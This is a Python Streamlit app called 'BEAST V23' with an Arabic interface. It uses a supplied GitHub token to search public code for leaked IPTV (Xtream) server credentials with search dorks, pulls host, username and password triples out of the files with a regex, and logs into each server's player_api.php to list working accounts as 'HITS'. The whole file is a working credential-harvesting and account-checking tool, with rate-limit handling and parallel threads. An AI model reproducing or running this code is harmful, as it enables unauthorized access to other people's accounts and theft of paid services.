import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

st.set_page_config(page_title="BEAST V23 - RATE LIMIT SMART", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - SMART SCAN</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23")
    token = st.text_input("GitHub Token:", type="password")
    delay_between_pages = st.slider("⏱️ التأخير بين الصفحات (ثواني)", 2, 20, 5)
    max_workers = st.slider("عدد الخيوط المتوازية (للملفات)", 5, 30, 10)
    start = st.button("🚀 ابدأ (مع إدارة حد المعدل)")

st.subheader("📡 الرادار المباشر")
radar_area = st.empty()

st.subheader("🏆 النتائج الشغالة (Hits)")
hits_area = st.container()

if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # قائمة دروكس مركزة (عدد أقل لكن كل منها يعطي نتائج أكبر)
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:txt "portal.php?username="',
        'extension:php "username" "password" "server"',
        'extension:json "server" "username" "password"',
        'path:.env "XTREAM"',
    ]
    
    found_count = 0
    total_requests = 0
    rate_limit_wait_time = 60  # ثانية
    
    for dork in dorks:
        page = 1
        more_pages = True
        while more_pages:
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = requests.get(search_url, headers=headers)
                total_requests += 1
                
                # التحقق من Rate Limit قبل قراءة JSON
                if res.status_code == 403 and 'rate limit' in res.text.lower():
                    radar_area.warning(f"⏳ Rate limit وصل! انتظار {rate_limit_wait_time} ثانية...")
                    time.sleep(rate_limit_wait_time)
                    continue  # إعادة محاولة نفس الصفحة
                
                data = res.json()
                
                if "items" not in data:
                    radar_area.warning(f"⚠️ لا توجد نتائج أو خطأ: {data.get('message', '')}")
                    break
                
                items = data.get("items", [])
                if not items:
                    more_pages = False
                    break
                
                radar_area.info(f"🔍 {dork[:40]}... | صفحة {page} | {len(items)} ملف")
                
                # استخراج الروابط الخام
                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in items]
                
                def process_file(raw_url):
                    try:
                        content = requests.get(raw_url, timeout=5).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        return [(host, user, pw) for host, user, pw in matches]
                    except:
                        return []
                
                with ThreadPoolExecutor(max_workers=min(max_workers, len(raw_urls))) as executor:
                    future_to_url = {executor.submit(process_file, url): url for url in raw_urls}
                    for future in as_completed(future_to_url):
                        creds = future.result()
                        for host, user, pw in creds:
                            radar_area.markdown(f"<p class='scan-log'>🔄 فحص: {host}</p>", unsafe_allow_html=True)
                            try:
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(check_url, timeout=3)
                                if r.status_code == 200:
                                    try:
                                        js = r.json()
                                        if js.get("user_info", {}).get("status") == "Active":
                                            found_count += 1
                                            with hits_area:
                                                st.markdown(f"""
                                                <div class="active-hit">
                                                    <span class="text-green">✅ HIT #{found_count}</span><br>
                                                    <span class="text-white">HOST: {host}</span><br>
                                                    <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                                </div>
                                                """, unsafe_allow_html=True)
                                    except:
                                        pass
                            except:
                                continue
                
                page += 1
                # تأخير بين الصفحات لتجنب الوصول السريع للحد
                time.sleep(delay_between_pages)
                
            except Exception as e:
                radar_area.error(f"خطأ: {str(e)}")
                time.sleep(10)
    
    st.success(f"✅ تم الانتهاء! إجمالي الـ HITS: {found_count} من {len(dorks)} Dork")
